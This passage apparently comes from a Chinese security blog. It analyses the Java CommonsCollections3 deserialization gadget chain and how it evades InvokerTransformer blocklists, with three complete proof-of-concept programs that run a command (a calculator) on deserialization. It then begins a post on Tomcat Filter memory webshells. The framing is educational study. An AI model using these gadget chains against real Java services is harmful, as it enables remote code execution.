day》，以及Java反序列化利⽤⼯具<code>ysoserial</code>，随后引爆了安全界。开发者们⾃然会去找寻⼀种安全的过滤⽅法，于是类似<code>SerialKiller</code>这样的⼯具随之诞⽣。<code>SerialKiller</code>是⼀个Java反序列化过滤器，可以通过⿊名单与⽩名单的⽅式来限制反序列化时允许通过的类。在其发布的第⼀个版本代码中，我们可以看到其给出了最初的⿊名单：</p><p><img src="/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/1.png"></p><p>​    这些工具增加了对CC1的核心类<code>InvokerTransformer</code>的防范，因此我们组合cc1和cc2链的新的调用方式是会被阻拦的，有攻就有防，<code>ysoserial</code>随后增加了不少新的Gadgets，其中就包括<code>CommonsCollections3</code>。<code>CommonsCollections3</code>的⽬的很明显，就是为了绕过⼀些规则对<code>InvokerTransformer</code>的限制。<code>CommonsCollections3</code>并没有使⽤到<code>InvokerTransformer</code>来调⽤任意⽅法，⽽是⽤到了另⼀个类，<code> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code>。</p><p>跟进这个类进行查看，发现它的构造函数存在该语句：<code>(TransformerImpl) templates.newTransformer()</code>，因此可以免去了我们使⽤<br><code>InvokerTransformer</code>⼿⼯调⽤<code> newTransformer()</code> ⽅法这⼀步。</p><p><img src="/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/3.png"></p><p>但是我们还是需要面对一个问题：缺少了<code>InvokerTransformer</code>，<code>TrAXFilter</code>的构造⽅法也是⽆法调⽤的。</p><p>这⾥yso的作者采取的解决的方式是：用到⼀个新的<code>Transformer</code>，就是<code>org.apache.commons.collections.functors.InstantiateTransformer </code>。<code>InstantiateTransformer</code>也是⼀个实现了Transformer接⼝的类，他的作⽤就是调⽤构造⽅法。</p><p><img src="/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/4.png"></p><p>因此现在的目标就是：利⽤ <code>InstantiateTransformer </code>来调⽤到 <code>TrAXFilter </code>的构造⽅法，再利⽤其构造⽅法⾥的 <code>templates.newTransformer() </code>调⽤到 <code>TemplatesImpl </code>⾥的字节码。</p><p>这样就比避免使用<code>InvokerTransformer</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>    <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>    <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;obj&#125;)<br>&#125;;<br></code></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc3_laster</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, CannotCompileException, NotFoundException, IOException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass = pool.makeClass(<span class="hljs-string">&quot;evilCode&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] ctClassBytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;ctClassBytes&#125;;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = obj.getClass();<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,targetByteCodes);<br>        _tfactory.set(obj,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;obj&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innermap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outermap = TransformedMap.decorate(innermap,<span class="hljs-keyword">null</span>,chainedTransformer);<br>        outermap.put(<span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;xxxx&quot;</span>);<br><span class="hljs-comment">//        Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter&quot;);</span><br><span class="hljs-comment">//        Class.forName(&quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;);</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/5.png"></p><h1 id="5-完整反序列化POC-1"><a href="#5-完整反序列化POC-1" class="headerlink" title="5.完整反序列化POC-1"></a>5.完整反序列化POC-1</h1><p>利用<code>TransformedMap</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc3_laster</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, CannotCompileException, NotFoundException, IOException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, InstantiationException </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass = pool.makeClass(<span class="hljs-string">&quot;evilCode&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] ctClassBytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;ctClassBytes&#125;;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = obj.getClass();<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,targetByteCodes);<br>        _tfactory.set(obj,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;obj&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innermap = <span class="hljs-keyword">new</span> HashMap();<br>        innermap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        Map outermap = TransformedMap.decorate(innermap,<span class="hljs-keyword">null</span>,chainedTransformer);<br>        Class aClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor constructor = aClass.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object object = constructor.newInstance(Retention.class,outermap);<br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(object);<br>        objectOutputStream.close();<br><br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        Object object1 = objectInputStream.readObject();<br>        <br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/6.png"></p><h1 id="6-完整反序列化POC-2"><a href="#6-完整反序列化POC-2" class="headerlink" title="6.完整反序列化POC-2"></a>6.完整反序列化POC-2</h1><p>利用<code>LazyMap</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> ysoserial.Demo;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.xalan.xsltc.trax.TransformerFactoryImpl;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cc3_laster1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass ctClass = pool.makeClass(<span class="hljs-string">&quot;evilCode&quot;</span>);<br>        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;deepin-calculator\&quot;);&quot;</span>;<br>        ctClass.makeClassInitializer().insertBefore(cmd);<br><br>        <span class="hljs-keyword">byte</span>[] ctClassBytes = ctClass.toBytecode();<br>        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;ctClassBytes&#125;;<br>        TemplatesImpl obj = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        Class clazz = obj.getClass();<br>        Field _name = clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        Field _bytecode = clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        Field _tfactory = clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _tfactory.setAccessible(<span class="hljs-keyword">true</span>);<br>        _bytecode.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(obj,<span class="hljs-string">&quot;reader-l&quot;</span>);<br>        _bytecode.set(obj,targetByteCodes);<br>        _tfactory.set(obj,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(TrAXFilter.class),<br>            <span class="hljs-keyword">new</span> InstantiateTransformer(<span class="hljs-keyword">new</span> Class[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> Object[]&#123;obj&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        Map innermap = <span class="hljs-keyword">new</span> HashMap();<br>        Map outerMap = LazyMap.decorate(innermap,chainedTransformer);<br><br>        Class aclass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor constructor = aclass.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-keyword">true</span>);<br>        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, outerMap);<br>        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="hljs-keyword">new</span> Class[]&#123;Map.class&#125;,handler);<br>        handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(handler);<br>        objectOutputStream.close();<br><br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray()));<br>        objectInputStream.readObject();<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="/2021/05/16/Java%E5%AE%89%E5%85%A8-CommonsCollections3%E9%93%BE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/7.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-前言&quot;&gt;&lt;a href=&quot;#1-前言&quot; class=&quot;headerlink&quot; title=&quot;1.前言&quot;&gt;&lt;/a&gt;1.前言&lt;/h1&gt;&lt;p&gt;​    这篇文章是基于phith0n师傅在代码审计星球里的《Java安全漫谈系列》的第十四篇的文章来进行学习的。&lt;/p&gt;
</summary>
      
    
    
    
    <category term="JAVA安全" scheme="https://reader-l.github.io/categories/JAVA%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Tomcat内存马学习一-Filter型</title>
    <link href="https://reader-l.github.io/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/"/>
    <id>https://reader-l.github.io/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/</id>
    <published>2021-05-09T01:39:38.000Z</published>
    <updated>2021-05-16T13:17:38.493Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>​    在现在防护软件的越来越智能化以及开发人员、运维人员等IT行业人员的安全意识越来越高，传统的文件shell大多都气数已尽了，而内存马因其隐蔽性等优点从而越来越盛行。因此有必要的进行学习。</p><h1 id="2-知识简介"><a href="#2-知识简介" class="headerlink" title="2.知识简介"></a>2.知识简介</h1><h2 id="1-什么是Servlet"><a href="#1-什么是Servlet" class="headerlink" title="1.什么是Servlet"></a>1.什么是Servlet</h2><p>​    处理请求和发送响应的过程是由一种叫做<code>Servlet</code>的程序来完成的，并且<code>Servlet</code>是为了解决实现动态页面而衍生的东西。</p><h2 id="2-Tomcat和Servlet的关系"><a href="#2-Tomcat和Servlet的关系" class="headerlink" title="2.Tomcat和Servlet的关系"></a>2.Tomcat和Servlet的关系</h2><p>​    Tomcat 是Web应用服务器,是一个Servlet/JSP容器. Tomcat 作为Servlet容器,负责处理客户请求,把请求传送给Servlet,并将Servlet的响应传送回给客户。</p><p>​    其中Tomcat中有四种类型的Servlet容器，从上到下分别是 <code>Engine、Host、Context、Wrapper</code></p><ol><li>Engine，实现类为 <code>org.apache.catalina.core.StandardEngine</code></li><li>Host，实现类为 <code>org.apache.catalina.core.StandardHost</code></li><li>Context，实现类为 <code>org.apache.catalina.core.StandardContext</code></li><li>Wrapper，实现类为 <code>org.apache.catalina.core.StandardWrapper</code></li></ol><p>​    每个Wrapper实例表示一个具体的Servlet定义，StandardWrapper是Wrapper接口的标准实现类（StandardWrapper 的主要任务就是载入Servlet类并且进行实例化）</p><h2 id="3-Tomcat-容器"><a href="#3-Tomcat-容器" class="headerlink" title="3.Tomcat 容器"></a>3.Tomcat 容器</h2><p>​    在 Tomcat 中，每个 Host 下可以有多个 Context （Context 是 Host 的子容器）， 每个 Context 都代表一个具体的Web应用，都有一个唯一的路径，在一个 Context 下可以有着多个 Wrapper</p><p>​    Wrapper 主要负责管理 <code>Servlet</code> ，包括的 <code>Servlet</code> 的装载、初始化、执行以及资源回收。</p><h2 id="4-内存马简单介绍"><a href="#4-内存马简单介绍" class="headerlink" title="4.内存马简单介绍"></a>4.内存马简单介绍</h2><p>内存马现在有如下类型：</p><ol><li>servlet-api类<ul><li>filter型</li><li>servlet型</li></ul></li><li>spring类<ul><li>拦截器</li><li>controller型</li></ul></li><li>Java Instrumentation类<ul><li>agent型</li></ul></li></ol><h1 id="3-Filter型的内存马"><a href="#3-Filter型的内存马" class="headerlink" title="3.Filter型的内存马"></a>3.Filter型的内存马</h1><h2 id="1-Filter简介"><a href="#1-Filter简介" class="headerlink" title="1.Filter简介"></a>1.Filter简介</h2><p>​    我们可以通过自定义FIlter来对用户的一些请求进行拦截修改等操作。Filter 程序是一个实现了 Filter 接口的 Java 类，与 Servlet 程序相似，它由 Servlet容器进行调用和执行。这个 Servlet 过滤器就是我们的 filter，当在 web.xml 中注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，这个Filter 就成了 Tomcat 与该 Servlet 程序的通信线路上的一道关卡，该 Filter 可以对Servlet 容器发送给 Servlet 程序的请求和 Servlet 程序回送给 Servlet 容器的响应进行拦截，可以决定是否将请求继续传递给 Servlet 程序，以及对请求和相应信息是否进行修改。</p><p>​    如下图是其简单的工作流程图：摘自<a href="https://paper.seebug.org/1441/#1jsp-webshell">https://paper.seebug.org/1441/#1jsp-webshell</a></p><p><img src="/2021/05/09/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0%E4%B8%80-Filter%E5%9E%8B/1.png"></p><h2 id="2-Filter实例"><a href="#2-Filter实例" class="headerlink" title="2.Filter实例"></a>2.Filter实例</h2><p>先创建自定义的WebFilter：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.Tomcat;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-meta">@WebFilter(filterName = &quot;FilterDemo&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FilterDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Filter</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(FilterConfig config)</span> <span class="hljs-keyword">throws</span> ServletException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;Filter创建&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;执行过滤操作&quot;</span>);<br>        chain.doFilter(request, response);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后在web.xml中注册我们的Filter：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span 